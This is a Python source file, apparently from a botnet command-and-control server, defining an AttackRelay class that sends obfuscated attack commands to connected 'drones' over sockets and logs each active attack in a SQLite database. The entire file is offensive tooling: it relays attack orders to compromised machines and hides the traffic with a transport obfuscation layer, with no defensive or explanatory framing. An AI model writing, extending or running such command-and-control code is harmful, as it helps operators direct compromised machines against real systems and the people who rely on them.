import json
import time
import sqlite3
from datetime import datetime

from utils.constants import *
from utils.helpers import *
from core.state import *

class AttackRelay:
    def __init__(self):
        self.active_attacks = {}
    
    def send_command(self, drone_id, command, params=None):
        with clients_lock:
            sock = clients.get(drone_id)
            if not sock:
                return {"success": False, "error": "Drone not connected"}
        payload = json.dumps({"cmd": command, "params": params or {}})
        obfuscated = TransportObfuscationLayer.obfuscate(payload) + b"\n"
        try:
            sock.sendall(obfuscated)
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def start_attack(self, drone_id, attack_type, params=None):
        result = self.send_command(drone_id, attack_type, params)
        if result["success"]:
            attack_id = f"{drone_id}_{attack_type}_{int(time.time())}"
            self.active_attacks[attack_id] = {"drone_id": drone_id, "attack_type": attack_type, "status": "active"}
            conn = sqlite3.connect(DB_FILE_PATH)
            cursor = conn.cursor()
            cursor.execute("INSERT INTO active_attacks (attack_id, drone_id, attack_type, status, started_at, params) VALUES (?, ?, ?, ?, ?, ?)",
                          (attack_id, drone_id, attack_type, "active", datetime.now().isoformat(), json.dumps(params or {})))
            conn.commit()
            conn.close()
        return result